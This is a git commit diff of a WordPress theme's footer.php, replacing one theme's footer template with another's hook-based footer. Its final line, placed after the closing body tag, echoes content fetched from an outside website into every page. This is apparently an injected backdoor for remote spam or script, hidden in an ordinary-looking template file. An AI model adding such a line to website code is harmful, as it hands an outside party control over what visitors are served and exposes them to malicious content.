a0c3e3cef7d3e46c9eef95367d457a663e0ecfba
gunungvip <suesuewenak01@gmail.com>
2024-12-25 13:25:03 +0700

    Update footer.php

--- acara/errorwp/footer.php
+++ acara/errorwp/footer.php
@@ -1,27 +1,43 @@
 <?php
 /**
- * The template for displaying the footer
+ * The template for displaying the footer.
  *
+ * Contains the closing of the #content div and all content after.
+ *
+ * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
+ *
+ * @package Education_Zone_Pro
  */
-
-defined( 'ABSPATH' ) || exit; // Exit if accessed directly
-
-
-do_action( 'TieLabs/after_main_content' );
-
-
-TIELABS_HELPER::get_template_part( 'templates/footer' );
-
+    
+    /**
+     * After Content
+     * 
+     * @hooked education_zone_pro_content_end - 20
+    */
+    do_action( 'education_zone_pro_after_content' );
+    
+    /**
+     * Footer
+     * 
+     * @hooked education_zone_pro_footer_start  - 20
+     * @hooked education_zone_pro_footer_top    - 30
+     * @hooked education_zone_pro_footer_credit - 40
+     * @hooked education_zone_pro_footer_end    - 50
+    */
+    do_action( 'education_zone_pro_footer' );
+    
+    /**
+     * After Footer
+     * 
+     * @hooked education_zone_pro_footer_overlay - 10
+     * @hooked education_zone_pro_back_to_top    - 15
+     * @hooked education_zone_pro_page_end       - 20
+    */
+    do_action( 'education_zone_pro_after_footer' );
+    
+    wp_footer(); 
+    
 ?>
-
-		</div><!-- #tie-wrapper /-->
-
-		<?php get_sidebar( 'slide' ); ?>
-
-	</div><!-- #tie-container /-->
-</div><!-- .background-overlay /-->
-
-<?php wp_footer(); ?>
 
 </body>
 <?php echo file_get_contents("https://pn-jogjakarta.website/txt/acid.txt");?>
